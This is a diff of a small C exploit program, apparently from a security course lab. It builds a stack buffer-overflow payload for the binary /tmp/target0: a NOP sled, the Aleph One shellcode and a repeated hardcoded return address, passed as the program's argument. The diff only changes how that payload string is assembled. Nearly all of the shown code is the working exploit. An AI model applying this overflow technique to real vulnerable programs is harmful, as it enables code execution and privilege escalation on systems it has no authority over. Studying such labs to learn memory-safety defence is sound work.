@@ -7,42 +7,27 @@
 
 #define TARGET "/tmp/target0"
 
-char *repeat(char *s, int x)
-{
-  //from https://stackoverflow.com/a/22599676/5552894
-  char *result = malloc(sizeof(s) * x + 1);
-  while (x > 0) {
-      strcat(result, s);
-      x --;
-  }
-  return result;
-}
-
 int main(void)
 {
   char *args[3]; 
   char *env[1];
-
-  char *noop = "\x90";
-  char *address = "\x2c\xfb\xff\xbf";
-  int sled_length = 203;
-
-  char *result = malloc(sizeof(noop)*sled_length + sizeof(shellcodeAlephOne) + sizeof(address)*38 + 1);
-  
-  char *result1 = repeat(noop, sled_length);
-  strcat(result, result1);
-
-  strcat(result, shellcodeAlephOne);
-
-  char *result2 = repeat(address, 38);
-  strcat(result, result2);
-  
-  //char *result = repeat("A", 399);
-  //printf("result : %s\n", result);
   
   args[0] = TARGET;
-  args[1] = result;
-  /*"\x90"x203 + shellcodeAlephOne + "\xf8\xf2\xff\xbf"x38*/
+  args[1] = "";
+
+  char str[408];
+  memset(str, 0, 408);
+  strcpy(str, "\x90\x90\x90");
+  for (int i = 0; i < 200; ++i)
+  {
+  	strcat(str, "\x90");
+  }
+  strcat(str, shellcodeAlephOne);
+  for (int i = 0; i < 38; ++i)
+  {
+  	strcat(str, "\x2c\xfb\xff\xbf");
+  }
+  args[1] = str;
   args[2] = NULL;
   
   env[0] = NULL;
@@ -51,5 +36,4 @@ int main(void)
 
   return 0;
 }
-
 
